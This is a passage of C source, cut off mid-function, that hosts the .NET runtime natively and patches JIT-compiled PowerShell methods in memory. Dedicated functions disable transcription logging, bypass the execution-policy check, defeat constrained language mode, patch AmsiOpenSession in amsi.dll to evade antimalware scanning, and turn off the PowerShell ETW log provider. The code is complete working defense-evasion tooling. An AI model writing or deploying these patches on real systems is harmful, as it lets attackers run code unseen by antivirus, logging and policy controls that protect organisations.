#include "pch.h"

struct _AppDomain* InitializeCommonLanguageRuntime
(
    _In_ LPWSTR lpDomainName,
    _Out_ PBOOL pIsLoadedBefore
)
{
    struct _AppDomain* pResult = NULL;
    HRESULT hr = S_OK;
    ICLRMetaHost* pMetaHost = NULL;
    ICLRRuntimeInfo* pRuntimeInfo = NULL;
    ICorRuntimeHost* pRuntimeHost = NULL;
    IUnknown* pAppDomainThunk = NULL;
    BOOL bIsLoadable = FALSE;
    CLSID CLSID_CLRMetaHost = { 0x9280188D, 0x0E8E, 0x4867, {0xB3, 0x0C, 0x7F, 0xA8, 0x38, 0x84, 0xE8, 0xDE} };
    IID IID_ICLRMetaHost = { 0xD332DB9E, 0xB9B3, 0x4125, {0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16} };
    IID IID_ICLRRuntimeInfo = { 0xBD39D1D2, 0xBA2F, 0x486A, {0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91} };
    CLSID CLSID_CorRuntimeHost = { 0xCB2F6723, 0xAB3A, 0x11D2, {0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E} };
    IID IID_ICorRuntimeHost = { 0xCB2F6722, 0xAB3A, 0x11D2, {0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E} };
    IID IID_AppDomain = { 0x05F696DC, 0x2B29, 0x3663, {0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13} };
    struct _AppDomain* pAppDomain = NULL;
    BOOL IsLoaded = FALSE;
    BSTR bstrCurrentAppDomainName = NULL;
    HDOMAINENUM hEnum = NULL;

    hr = CLRCreateInstance(&CLSID_CLRMetaHost, &IID_ICLRMetaHost, (LPVOID*)(&pMetaHost));
    if (FAILED(hr)) {
        LOG_ERROR("CLRCreateInstance", hr);
        goto CLEANUP;
    }

    hr = pMetaHost->lpVtbl->GetRuntime(pMetaHost, L"v4.0.30319", &IID_ICLRRuntimeInfo, (LPVOID*)(&pRuntimeInfo));
    if (FAILED(hr)) {
        LOG_ERROR("pMetaHost->GetRuntime", hr);
        goto CLEANUP;
    }

    //hr = pRuntimeInfo->lpVtbl->IsLoaded(pRuntimeInfo, GetCurrentProcess(, &IsLoaded);
    hr = pRuntimeInfo->lpVtbl->IsLoadable(pRuntimeInfo, &bIsLoadable);
    if (FAILED(hr)) {
        LOG_ERROR("pRuntimeInfo->IsLoadable", hr);
        goto CLEANUP;
    }

    if (!bIsLoadable) {
        goto CLEANUP;
    }

    hr = pRuntimeInfo->lpVtbl->GetInterface(pRuntimeInfo, &CLSID_CorRuntimeHost, &IID_ICorRuntimeHost, (LPVOID*)(&pRuntimeHost));
    if (FAILED(hr)) {
        LOG_ERROR("pRuntimeInfo->GetInterface", hr);
        goto CLEANUP;
    }

    hr = pRuntimeHost->lpVtbl->Start(pRuntimeHost);
    if (FAILED(hr)) {
        LOG_ERROR("pRuntimeHost->Start", hr);
        goto CLEANUP;
    }

    hr = pRuntimeHost->lpVtbl->EnumDomains(pRuntimeHost, &hEnum);
    if (FAILED(hr)) {
        LOG_ERROR("pRuntimeHost->EnumDomains", hr);
        goto CLEANUP;
    }

    while (pRuntimeHost->lpVtbl->NextDomain(pRuntimeHost, hEnum, &pAppDomainThunk) == S_OK) {
        hr = pAppDomainThunk->lpVtbl->QueryInterface(pAppDomainThunk, &IID_AppDomain, (LPVOID*)(&pAppDomain));
        if (SUCCEEDED(hr)) {
            pAppDomain->lpVtbl->get_FriendlyName(pAppDomain, &bstrCurrentAppDomainName);
            if (!lstrcmpW(bstrCurrentAppDomainName, lpDomainName)) {
                IsLoaded = TRUE;
                if (pIsLoadedBefore != NULL) {
                    *pIsLoadedBefore = TRUE;
                }

                break;
            }
        }

        pAppDomainThunk->lpVtbl->Release(pAppDomainThunk);
    }

    pRuntimeHost->lpVtbl->CloseEnum(pRuntimeHost, hEnum);
    if (!IsLoaded) {
        hr = pRuntimeHost->lpVtbl->CreateDomain(pRuntimeHost, lpDomainName, NULL, &pAppDomainThunk);
        if (FAILED(hr)) {
            LOG_ERROR("pRuntimeHost->CreateDomain", hr);
            goto CLEANUP;
        }

        hr = pAppDomainThunk->lpVtbl->QueryInterface(pAppDomainThunk, &IID_AppDomain, (LPVOID*)(&pAppDomain));
        if (FAILED(hr)) {
            LOG_ERROR("pAppDomainThunk->QueryInterface", hr);
            goto CLEANUP;
        }
    }

    /*pResult = ALLOC(sizeof(CLR_CONTEXT));
    pResult->pMetaHost = pMetaHost;
    pResult->pRuntimeInfo = pRuntimeInfo;
    pResult->pRuntimeHost = pRuntimeHost;
    pResult->pAppDomainThunk = pAppDomainThunk;*/
    pResult = pAppDomain;
CLEANUP:
    /*if (!IsOk && pAppDomain) {
        pAppDomain->lpVtbl->Release(pAppDomain);
    }*/

    if (pAppDomainThunk) {
        pAppDomainThunk->lpVtbl->Release(pAppDomainThunk);
    }

    if (pRuntimeHost) {
        pRuntimeHost->lpVtbl->Release(pRuntimeHost);
    }

    if (pRuntimeInfo) {
        pRuntimeInfo->lpVtbl->Release(pRuntimeInfo);
    }

    if (pMetaHost) {
        pMetaHost->lpVtbl->Release(pMetaHost);
    }

    return pResult;
}

BOOL GetAssembly
(
    _In_ struct _AppDomain* pAppDomain,
    _In_ LPWSTR lpAssemblyName,
    _Out_ struct _Assembly** ppAssembly
)
{
    BOOL bResult = FALSE;
    HRESULT hr = S_OK;
    DWORD dwAssembliesLowerBound = 0;
    DWORD dwAssembliesUpperBound = 0;
    DWORD cchTargetAssemblyName = 0;
    BSTR bstrAssemblyFullName = NULL;
    SAFEARRAY* pLoadedAssembliesArray = NULL;
    struct _Assembly** ppLoadedAssemblies = NULL;
    DWORD i, j;

    cchTargetAssemblyName = lstrlenW(lpAssemblyName);
    hr = pAppDomain->lpVtbl->GetAssemblies(pAppDomain, &pLoadedAssembliesArray);
    if (FAILED(hr)) {
        LOG_ERROR("pAppDomain->GetAssemblies", hr);
        goto CLEANUP;
    }

    SafeArrayGetLBound(pLoadedAssembliesArray, 1, &dwAssembliesLowerBound);
    SafeArrayGetUBound(pLoadedAssembliesArray, 1, &dwAssembliesUpperBound);
    hr = SafeArrayAccessData(pLoadedAssembliesArray, (void**)&ppLoadedAssemblies);
    for (i = 0; i < dwAssembliesUpperBound - dwAssembliesLowerBound + 1; i++) {
        bstrAssemblyFullName = NULL;
        hr = ppLoadedAssemblies[i]->lpVtbl->get_FullName(ppLoadedAssemblies[i], &bstrAssemblyFullName);
        if (SUCCEEDED(hr)) {
            if (lstrlenW(bstrAssemblyFullName) > cchTargetAssemblyName) {
                for (j = 0; j < cchTargetAssemblyName; j++) {
                    if (lpAssemblyName[j] != bstrAssemblyFullName[j]) {
                        break;
                    }
                }

                if (j == cchTargetAssemblyName) {
                    if (bstrAssemblyFullName[j] == L',') {
                        bResult = TRUE;
                        *ppAssembly = ppLoadedAssemblies[i];
                        break;
                    }
                }
            }

            SysFreeString(bstrAssemblyFullName);
        }
    }

CLEANUP:
    if (pLoadedAssembliesArray) {
        SafeArrayDestroy(pLoadedAssembliesArray);
    }

    return bResult;
}

LPWSTR FindAssemblyPath
(
    _In_ LPWSTR lpAssemblyName
)
{
    LPWSTR lpResult = NULL;
    WIN32_FIND_DATA FindData;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    HANDLE hAssemblyFile = NULL;
    WCHAR wszAssemblyFolderPath[MAX_PATH];
    WCHAR wszMaskPath[MAX_PATH];
    WCHAR wszTemp[MAX_PATH];

    SecureZeroMemory(&FindData, sizeof(FindData));
    ExpandEnvironmentStringsW(L"%WINDIR%\\Microsoft.NET\\assembly\\GAC_MSIL", wszAssemblyFolderPath, _countof(wszAssemblyFolderPath));
    wsprintfW(wszMaskPath, L"%s\\%s\\*", wszAssemblyFolderPath, lpAssemblyName);
    hFind = FindFirstFileW(wszMaskPath, &FindData);
    if (hFind == INVALID_HANDLE_VALUE) {
        LOG_ERROR("FindFirstFileW", GetLastError());
        goto CLEANUP;
    }

    do
    {
        if (!lstrcmpW(FindData.cFileName, L".") || !lstrcmpW(FindData.cFileName, L"..")) {
            continue;
        }

        if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            wsprintfW(wszTemp, L"%s\\%s\\%s\\%s.dll", wszAssemblyFolderPath, lpAssemblyName, FindData.cFileName, lpAssemblyName);
            if (IsFileExist(wszTemp)) {
                lpResult = DuplicateStrW(wszTemp, 0);
                break;
            }
        }
    } while (FindNextFileW(hFind, &FindData) != 0);

CLEANUP:
    if (hFind != INVALID_HANDLE_VALUE) {
        FindClose(hFind);
    }

    return lpResult;
}

struct _Assembly* LoadAssembly
(
    _In_ struct _AppDomain* pAppDomain,
    _In_ LPWSTR lpAssemblyName
)
{
    struct _Assembly* pResult = NULL;
    HRESULT hr = S_OK;
    DWORD dwNumberOfBytesRead = 0;
    HANDLE hAssemblyFile = INVALID_HANDLE_VALUE;
    LPWSTR lpAssemblyPath = NULL;
    LARGE_INTEGER liAssemblyFileSize;
    SAFEARRAYBOUND ArrayBound;
    SAFEARRAY* pSafeAssembly = NULL;
    struct _Assembly* pAssembly = NULL;

    SecureZeroMemory(&ArrayBound, sizeof(ArrayBound));
    SecureZeroMemory(&liAssemblyFileSize, sizeof(liAssemblyFileSize));
    if (!GetAssembly(pAppDomain, lpAssemblyName, &pAssembly)) {
        lpAssemblyPath = FindAssemblyPath(lpAssemblyName);
        if (lpAssemblyPath == NULL) {
            goto CLEANUP;
        }

        hAssemblyFile = CreateFileW(lpAssemblyPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hAssemblyFile == INVALID_HANDLE_VALUE) {
            LOG_ERROR("CreateFileW", GetLastError());
            goto CLEANUP;
        }

        if (!GetFileSizeEx(hAssemblyFile, &liAssemblyFileSize)) {
            LOG_ERROR("GetFileSizeEx", GetLastError());
            goto CLEANUP;
        }

        ArrayBound.cElements = (ULONG)liAssemblyFileSize.QuadPart;
        pSafeAssembly = SafeArrayCreate(VT_UI1, 1, &ArrayBound);
        if (!ReadFile(hAssemblyFile, pSafeAssembly->pvData, (DWORD)liAssemblyFileSize.QuadPart, &dwNumberOfBytesRead, NULL)) {
            LOG_ERROR("ReadFile", GetLastError());
            goto CLEANUP;
        }

        hr = pAppDomain->lpVtbl->Load_3(pAppDomain, pSafeAssembly, &pAssembly);
        if (FAILED(hr)) {
            LOG_ERROR("pAppDomain->Load_3", hr);
            goto CLEANUP;
        }
    }

    pResult = pAssembly;
CLEANUP:
    if (pSafeAssembly) {
        SafeArrayDestroy(pSafeAssembly);
    }

    if (hAssemblyFile != INVALID_HANDLE_VALUE) {
        CloseHandle(hAssemblyFile);
    }

    if (lpAssemblyPath) {
        FREE(lpAssemblyPath);
    }

    return pResult;
}

struct _MethodInfo* FindMethodInArray
(
    SAFEARRAY* pMethods,
    LPWSTR pwszMethodName,
    DWORD dwNumberOfArguments
)
{
    struct _MethodInfo* pResult = NULL;
    HRESULT hr = S_OK;
    DWORD dwMethodsLowerBound = 0;
    DWORD dwMethodsUpperBound = 0;
    LONG lParametersLowerBound, lParametersUpperBound;
    LPWSTR lpMethodName = NULL;
    SAFEARRAY* pParameters = NULL;
    struct _MethodInfo** ppMethods = NULL;

    SafeArrayGetLBound(pMethods, 1, &dwMethodsLowerBound);
    SafeArrayGetUBound(pMethods, 1, &dwMethodsUpperBound);
    hr = SafeArrayAccessData(pMethods, (void**)&ppMethods);
    if (FAILED(hr)) {
        LOG_ERROR("SafeArrayAccessData", hr);
        goto CLEANUP;
    }

    for (int i = 0; i < dwMethodsUpperBound - dwMethodsLowerBound + 1; i++) {
        lpMethodName = NULL;
        hr = ppMethods[i]->lpVtbl->get_name(ppMethods[i], &lpMethodName);
        if (SUCCEEDED(hr)) {
            if (!lstrcmpW(lpMethodName, pwszMethodName)) {
                hr = ppMethods[i]->lpVtbl->GetParameters(ppMethods[i], &pParameters);
                if (SUCCEEDED(hr)) {
                    SafeArrayGetLBound(pParameters, 1, &lParametersLowerBound);
                    SafeArrayGetUBound(pParameters, 1, &lParametersUpperBound);
                    if (lParametersUpperBound - lParametersLowerBound + 1 == dwNumberOfArguments) {
                        pResult = ppMethods[i];
                        break;
                    }
                }
            }

            SysFreeString(lpMethodName);
        }
    }

CLEANUP:
    if (pParameters) {
        SafeArrayDestroy(pParameters);
    }

    return pResult;
}

BOOL PrepareMethod
(
    _In_ struct _AppDomain* pAppDomain,
    _In_ VARIANT* pvtMethodHandle
)
{
    BOOL bResult = FALSE;
    HRESULT hr = S_OK;
    DWORD dwArgumentIndex = 0;
    BSTR bstrRuntimeHelpersFullName = SysAllocString(L"System.Runtime.CompilerServices.RuntimeHelpers");
    SAFEARRAY* pRuntimeHelpersMethods = NULL;
    SAFEARRAY* pPrepareMethodArguments = NULL;
    VARIANT vtEmpty;
    VARIANT vtResult;
    struct _Assembly* pRuntimeAssembly = NULL;
    struct _Type* pRuntimeHelpersType = NULL;
    struct _MethodInfo* pPrepareMethod = NULL;

    SecureZeroMemory(&vtEmpty, sizeof(vtEmpty));
    SecureZeroMemory(&vtResult, sizeof(vtResult));
    pRuntimeAssembly = LoadAssembly(pAppDomain, L"System.Runtime");
    if (pRuntimeAssembly == NULL) {
        goto CLEANUP;
    }

    hr = pRuntimeAssembly->lpVtbl->GetType_2(pRuntimeAssembly, bstrRuntimeHelpersFullName, &pRuntimeHelpersType);
    if (FAILED(hr)) {
        LOG_ERROR("pRuntimeAssembly->GetType_2", hr);
        goto CLEANUP;
    }

    hr = pRuntimeHelpersType->lpVtbl->GetMethods(pRuntimeHelpersType, BindingFlags_Static | BindingFlags_Public, &pRuntimeHelpersMethods);
    if (FAILED(hr)) {
        LOG_ERROR("pRuntimeHelpersType->GetMethods", hr);
        goto CLEANUP;
    }

    pPrepareMethod = FindMethodInArray(pRuntimeHelpersMethods, L"PrepareMethod", 1);
    if (!pPrepareMethod) {
        goto CLEANUP;
    }

    pPrepareMethodArguments = SafeArrayCreateVector(VT_VARIANT, 0, 1);
    hr = SafeArrayPutElement(pPrepareMethodArguments, &dwArgumentIndex, pvtMethodHandle);
    if (FAILED(hr)) {
        LOG_ERROR("SafeArrayPutElement", hr);
        goto CLEANUP;
    }

    hr = pPrepareMethod->lpVtbl->Invoke_3(pPrepareMethod, vtEmpty, pPrepareMethodArguments, &vtResult);
    if (FAILED(hr)) {
        LOG_ERROR("pPrepareMethod->Invoke_3", hr);
        goto CLEANUP;
    }

    bResult = TRUE;
CLEANUP:
    SysFreeString(bstrRuntimeHelpersFullName);
    if (pRuntimeHelpersMethods != NULL) {
        SafeArrayDestroy(pRuntimeHelpersMethods);
    }

    if (pPrepareMethodArguments != NULL) {
        SafeArrayDestroy(pPrepareMethodArguments);
    }

    if (pPrepareMethod) {
        pPrepareMethod->lpVtbl->Release(pPrepareMethod);
    }

    if (pRuntimeHelpersType) {
        pRuntimeHelpersType->lpVtbl->Release(pRuntimeHelpersType);
    }

    if (pRuntimeAssembly) {
        pRuntimeAssembly->lpVtbl->Release(pRuntimeAssembly);
    }

    return bResult;
}

ULONG_PTR GetFunctionPointer
(
    _In_ struct _AppDomain* pAppDomain,
    _In_ VARIANT* pvtMethodHandle
)
{
    ULONG_PTR uResult = 0;
    HRESULT hr = S_OK;
    BSTR bstrRuntimeMethodHandleFullName = SysAllocString(L"System.RuntimeMethodHandle");
    SAFEARRAY* pRuntimeMethodHandleMethods = NULL;
    VARIANT vtFunctionPointer;
    struct _Assembly* pRuntimeAssembly = NULL;
    struct _Type* pRuntimeMethodHandleType = NULL;
    struct _MethodInfo* pGetFunctionPointerInfo = NULL;

    pRuntimeAssembly = LoadAssembly(pAppDomain, L"System.Runtime");
    if (pRuntimeAssembly == NULL) {
        goto CLEANUP;
    }

    hr = pRuntimeAssembly->lpVtbl->GetType_2(pRuntimeAssembly, bstrRuntimeMethodHandleFullName, &pRuntimeMethodHandleType);
    if (FAILED(hr)) {
        LOG_ERROR("pRuntimeAssembly->GetType_2", hr);
        goto CLEANUP;
    }

    if (pRuntimeMethodHandleType == NULL) {
        goto CLEANUP;
    }

    hr = pRuntimeMethodHandleType->lpVtbl->GetMethods(pRuntimeMethodHandleType, BindingFlags_Public | BindingFlags_Instance, &pRuntimeMethodHandleMethods);
    if (FAILED(hr)) {
        LOG_ERROR("pRuntimeMethodHandleType->GetMethods", hr);
        goto CLEANUP;
    }

    pGetFunctionPointerInfo = FindMethodInArray(pRuntimeMethodHandleMethods, L"GetFunctionPointer", 0);
    if (pGetFunctionPointerInfo == NULL) {
        goto CLEANUP;
    }

    hr = pGetFunctionPointerInfo->lpVtbl->Invoke_3(pGetFunctionPointerInfo, *pvtMethodHandle, NULL, &vtFunctionPointer);
    if (FAILED(hr)) {
        LOG_ERROR("pGetFunctionPointerInfo->Invoke_3", hr);
        goto CLEANUP;
    }

    uResult = vtFunctionPointer.ullVal;
CLEANUP:
    SysFreeString(bstrRuntimeMethodHandleFullName);
    if (pRuntimeMethodHandleMethods) SafeArrayDestroy(pRuntimeMethodHandleMethods);

    if (pGetFunctionPointerInfo) {
        pGetFunctionPointerInfo->lpVtbl->Release(pGetFunctionPointerInfo);
    }

    if (pRuntimeMethodHandleType) {
        pRuntimeMethodHandleType->lpVtbl->Release(pRuntimeMethodHandleType);
    }

    if (pRuntimeAssembly) {
        pRuntimeAssembly->lpVtbl->Release(pRuntimeAssembly);
    }

    return uResult;
}

ULONG_PTR GetJustInTimeMethodAddress
(
    _In_ struct _AppDomain* pAppDomain,
    _In_ LPWSTR pwszAssemblyName,
    _In_ LPWSTR pwszClassName,
    _In_ LPWSTR pwszMethodName,
    _In_ DWORD dwNumberOfArguments
)
{
    ULONG_PTR uResult = 0;
    HRESULT hr = S_OK;
    BSTR bstrClassName = SysAllocString(pwszClassName);
    BSTR bstrMethodInfoFullName = SysAllocString(L"System.Reflection.MethodInfo");
    BSTR bstrMethodHandlePropName = SysAllocString(L"MethodHandle");
    SAFEARRAY* pMethods = NULL;
    VARIANT vtMethodHandlePtr;
    VARIANT vtMethodHandleVal;
    struct _Assembly* pAssembly = NULL;
    struct _Assembly* pReflectionAssembly = NULL;
    struct _Type* pType = NULL;
    struct _Type* pMethodInfoType = NULL;
    struct _MethodInfo* pTargetMethodInfo = NULL;
    struct _PropertyInfo* pMethodHandlePropInfo = NULL;

    SecureZeroMemory(&vtMethodHandlePtr, sizeof(vtMethodHandlePtr));
    SecureZeroMemory(&vtMethodHandleVal, sizeof(vtMethodHandleVal));
    pAssembly = LoadAssembly(pAppDomain, pwszAssemblyName);
    if (pAssembly == NULL) {
        goto CLEANUP;
    }

    pReflectionAssembly = LoadAssembly(pAppDomain, L"System.Reflection");
    if (pReflectionAssembly == NULL) {
        goto CLEANUP;
    }

    hr = pAssembly->lpVtbl->GetType_2(pAssembly, bstrClassName, &pType);
    if (FAILED(hr)) {
        LOG_ERROR("pAssembly->GetType_2", hr);
        goto CLEANUP;
    }

    hr = pType->lpVtbl->GetMethods(pType, BindingFlags_Instance | BindingFlags_Static | BindingFlags_Public | BindingFlags_NonPublic | BindingFlags_DeclaredOnly, &pMethods);
    if (FAILED(hr)) {
        LOG_ERROR("pType->GetMethods", hr);
        goto CLEANUP;
    }

    pTargetMethodInfo = FindMethodInArray(pMethods, pwszMethodName, dwNumberOfArguments);
    if (pTargetMethodInfo == NULL) {
        goto CLEANUP;
    }

    if (pTargetMethodInfo == NULL) {
        goto CLEANUP;
    }

    hr = pReflectionAssembly->lpVtbl->GetType_2(pReflectionAssembly, bstrMethodInfoFullName, &pMethodInfoType);
    if (FAILED(hr)) {
        LOG_ERROR("pReflectionAssembly->GetType_2", hr);
        goto CLEANUP;
    }

    if (pMethodInfoType == NULL) {
        goto CLEANUP;
    }

    hr = pMethodInfoType->lpVtbl->GetProperty(pMethodInfoType, bstrMethodHandlePropName, BindingFlags_Instance | BindingFlags_Public, &pMethodHandlePropInfo);
    if (FAILED(hr)) {
        LOG_ERROR("pMethodInfoType->GetProperty", hr);
        goto CLEANUP;
    }

    if (pMethodHandlePropInfo == NULL) {
        goto CLEANUP;
    }

    vtMethodHandlePtr.vt = VT_UNKNOWN;
    vtMethodHandlePtr.punkVal = pTargetMethodInfo;
    hr = pMethodHandlePropInfo->lpVtbl->GetValue(pMethodHandlePropInfo, vtMethodHandlePtr, NULL, &vtMethodHandleVal);
    if (FAILED(hr)) {
        LOG_ERROR("pMethodHandlePropInfo->GetValue", hr);
        goto CLEANUP;
    }

    if (!PrepareMethod(pAppDomain, &vtMethodHandleVal)) {
        goto CLEANUP;
    }

    uResult = GetFunctionPointer(pAppDomain, &vtMethodHandleVal);
CLEANUP:
    SysFreeString(bstrClassName);
    SysFreeString(bstrMethodInfoFullName);
    SysFreeString(bstrMethodHandlePropName);
    if (pMethods) {
        SafeArrayDestroy(pMethods);
    }

    if (pTargetMethodInfo) {
        pTargetMethodInfo->lpVtbl->Release(pTargetMethodInfo);
    }

    if (pType) {
        pType->lpVtbl->Release(pType);
    }

    if (pMethodHandlePropInfo) {
        pMethodHandlePropInfo->lpVtbl->Release(pMethodHandlePropInfo);
    }

    if (pMethodInfoType) {
        pMethodInfoType->lpVtbl->Release(pMethodInfoType);
    }

    if (pReflectionAssembly) {
        pReflectionAssembly->lpVtbl->Release(pReflectionAssembly);
    }

    if (pAssembly) {
        pAssembly->lpVtbl->Release(pAssembly);
    }

    VariantClear(&vtMethodHandleVal);
    return uResult;
}

BOOL PatchProcedure
(
    _In_ LPVOID pTargetAddress,
    _In_ LPBYTE pSourceBuffer,
    _In_ DWORD dwSourceBufferSize
)
{
    BOOL bResult = FALSE;
    DWORD dwOldProtect = 0;

    if (!VirtualProtect(pTargetAddress, dwSourceBufferSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
        LOG_ERROR("VirtualProtectEx", GetLastError());
        goto CLEANUP;
    }

    memcpy(pTargetAddress, pSourceBuffer, dwSourceBufferSize);
    if (!VirtualProtect(pTargetAddress, dwSourceBufferSize, dwOldProtect, &dwOldProtect)) {
        LOG_ERROR("VirtualProtectEx", GetLastError());
        goto CLEANUP;
    }

    bResult = TRUE;
CLEANUP:
    return bResult;
}

BOOL PatchManagedFunction
(
    _In_ struct _AppDomain* pAppDomain,
    _In_ LPWSTR pwszAssemblyName,
    _In_ LPWSTR pwszClassName,
    _In_ LPWSTR pwszMethodName,
    _In_ DWORD dwNumberOfArguments,
    _In_ LPBYTE pbPatch,
    _In_ DWORD dwPatchSize,
    _In_ DWORD dwPatchOffset
)
{
    ULONG_PTR pMethodAddress = 0;

    pMethodAddress = GetJustInTimeMethodAddress(pAppDomain, pwszAssemblyName, pwszClassName, pwszMethodName, dwNumberOfArguments);
    if (pMethodAddress == 0) {
        return FALSE;
    }

    pMethodAddress += dwPatchOffset;
    return PatchProcedure((LPVOID)pMethodAddress, pbPatch, dwPatchSize);
}

BOOL PatchTranscriptionOptionFlushContentToDisk
(
    _In_ struct _AppDomain* pAppDomain
)
{
    BYTE bPatch[] = { 0xc3 };

    return PatchManagedFunction(pAppDomain, L"System.Management.Automation", L"System.Management.Automation.Host.TranscriptionOption", L"FlushContentToDisk", 0, bPatch, ARRAYSIZE(bPatch), 0);
}

BOOL PatchAuthorizationManagerShouldRunInternal
(
    _In_ struct _AppDomain* pAppDomain
)
{
    BYTE bPatch[] = { 0xc3 };

    return PatchManagedFunction(pAppDomain, L"System.Management.Automation", L"System.Management.Automation.AuthorizationManager", L"ShouldRunInternal", 3, bPatch, ARRAYSIZE(bPatch), 0);
}

BOOL PatchSystemPolicyGetSystemLockdownPolicy
(
    _In_ struct _AppDomain* pAppDomain
)
{
    BYTE bPatch[] = { 0x48, 0x31, 0xc0, 0xc3 }; // mov rax, 0; ret;

    return PatchManagedFunction(pAppDomain, L"System.Management.Automation", L"System.Management.Automation.Security.SystemPolicy", L"GetSystemLockdownPolicy", 0, bPatch, ARRAYSIZE(bPatch), 0);
}

BOOL PatchAmsiOpenSession()
{
    BYTE bPatch[] = { 0xeb };
    PBYTE pAmsiOpenSession = NULL;
    HMODULE hAmsi = NULL;
    DWORD dwOldProtect = 0;

    hAmsi = LoadLibraryW(L"amsi.dll");
    if (hAmsi == NULL) {
        return TRUE;
    }

    pAmsiOpenSession = (PBYTE)GetProcAddress(hAmsi, "AmsiOpenSession");
    if (pAmsiOpenSession == NULL) {
        return FALSE;
    }

    if (!VirtualProtect(pAmsiOpenSession, sizeof(bPatch), PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
        return FALSE;
    }

    memcpy(&pAmsiOpenSession[3], bPatch, sizeof(bPatch));
    if (!VirtualProtect(pAmsiOpenSession, sizeof(bPatch), dwOldProtect, &dwOldProtect)) {
        return FALSE;
    }

    return TRUE;
}

BOOL DisablePowerShellEtwProvider
(
    struct _AppDomain* pAppDomain
)
{
    BOOL bResult = FALSE;
    HRESULT hr = S_OK;
    VARIANT vtEmpty;
    VARIANT vtPsEtwLogProviderInstance;
    VARIANT vtZero;
    struct _Assembly* pCoreAssembly = NULL;
    struct _Assembly* pAutomationAssembly = NULL;
    struct _Type* pPsEtwLogProviderType = NULL;
    struct _FieldInfo* pEtwProviderFieldInfo = NULL;
    struct _Type* pEventProviderType = NULL;
    struct _FieldInfo* pEnabledInfo = NULL;
    BSTR bstrPsEtwLogProviderFullName = SysAllocString(L"System.Management.Automation.Tracing.PSEtwLogProvider");
    BSTR bstrEtwProviderFieldName = SysAllocString(L"etwProvider");
    BSTR bstrEventProviderFullName = SysAllocString(L"System.Diagnostics.Eventing.EventProvider");
    BSTR bstrEnabledFieldName = SysAllocString(L"m_enabled");

    SecureZeroMemory(&vtEmpty, sizeof(vtEmpty));
    SecureZeroMemory(&vtPsEtwLogProviderInstance, sizeof(vtPsEtwLogProviderInstance));
    SecureZeroMemory(&vtZero, sizeof(vtZero));
    pCoreAssembly = LoadAssembly(pAppDomain, L"System.Core");
    if (pCoreAssembly == NULL) {
        goto CLEANUP;
    }

    pAutomationAssembly = LoadAssembly(pAppDomain, L"System.Management.Automation");
    if (pAutomationAssembly == NULL) {
        goto CLEANUP;
    }

    hr = pAutomationAssembly->lpVtbl->GetType_2(pAutomationAssembly, bstrPsEtwLogProviderFullName, &pPsEtwLogProviderType);
    if (FAILED(hr)) {
        LOG_ERROR("pAutomationAssembly->GetType_2", hr);
        goto CLEANUP;
    }

    hr = pPsEtwLogProviderType->lpVtbl->GetField(pPsEtwLogProviderType, bstrEtwProviderFieldName, BindingFlags_Static | BindingFlags_NonPublic, &pEtwProviderFieldInfo);
    if (FAILED(hr)) {
        LOG_ERROR("pPsEtwLogProviderType->GetField", hr);
        goto CLEANUP;
    }

    hr = pEtwProviderFieldInfo->lpVtbl->GetValue(pEtwProviderFieldInfo, vtEmpty, &vtPsEtwLogProviderInstance);
    if (FAILED(hr)) {
        LOG_ERROR("pEtwProviderFieldInfo->GetValue", hr);
        goto CLEANUP;
    }

    hr = pCoreAssembly->lpVtbl->GetType_2(pCoreAssembly, bstrEventProviderFullName, &pEventProviderType);
    if (FAILED(hr)) {
        LOG_ERROR("pCoreAssembly->GetType_2", hr);
        goto CLEANUP;
    }

    hr = pEventProviderType->lpVtbl->GetField(pEventProviderType, bstrEnabledFieldName, BindingFlags_Instance | BindingFlags_NonPublic, &pEnabledInfo);
    if (FAILED(hr)) {
        LOG_ERROR("pEventProviderType->GetField", hr);
        goto CLEANUP;
    }

    vtZero.vt = VT_INT;
    vtZero.intVal = 0;
    hr = pEnabledInfo->lpVtbl->SetValue_2(pEnabledInfo, vtPsEtwLogProviderInstance, vtZero);
    if (FAILED(hr)) {
        LOG_ERROR("pEnabledInfo->SetValue_2", hr);
        goto CLEANUP;
    }

    bResult = TRUE;

CLEANUP:
    SysFreeString(bstrPsEtwLogProviderFullName);
    SysFreeString(bstrEtwProviderFieldName);
    SysFreeString(bstrEventProviderFullName);
    SysFreeString(bstrEnabledFieldName);
    if (pEnabledInfo) {
        pEnabledInfo->lpVtbl->Release(pEnabledInfo);
    }

    if (pEventProviderType) {
        pEventProviderType->lpVtbl->Release(pEventProviderType);
    }

    if (pEtwProviderFieldInfo) {
        pEtwProviderFieldInfo->lpVtbl->Release(pEtwProviderFieldInfo);
    }

    if (pPsEtwLogProviderType) {
        pPsEtwLogProviderType->lpVtbl->Release(pPsEtwLogProviderType);
    }

    if (pAutomationAssembly) {
        pAutomationAssembly->lpVtbl->Release(pAutomationAssembly);
    }

    if (pCoreAssembly) {
        pCoreAssembly->lpVtbl->Release(pCoreAssembly);
    }

    VariantClear(&vtPsEtwLogProviderInstance);

    return bResult;
}

BOOL CreateInitialRunspaceConfiguration
(
    _In_ struct _AppDomain* pAppDomain,
    _Inout_ VARIANT* pvtRunspaceConfiguration
)
{
    HRESULT hr = S_OK;
    BOOL bResult = FALSE;
    SAFEARRAY* pRunspaceConfigurationMethods = NULL;
    VARIANT vtEmpty;
    VARIANT vtResult;
    struct _Assembly* pAutomationAssembly = NULL;
    struct _Type* pRunspaceConfigurationType = NULL;
    struct _MethodInfo* pCreateMethodInfo = NULL;
    BSTR bstrRunspaceConfigurationFullName = SysAllocString(L"System.Management.Automation.Runspaces.RunspaceConfiguration");

    SecureZeroMemory(&vtEmpty, sizeof(vtEmpty));
    SecureZeroMemory(&vtResult, sizeof(vtResult));
    pAutomationAssembly = LoadAssembly(pAppDomain, L"System.Management.Automation");
    if (pAutomationAssembly == NULL) {
        goto CLEANUP;
    }

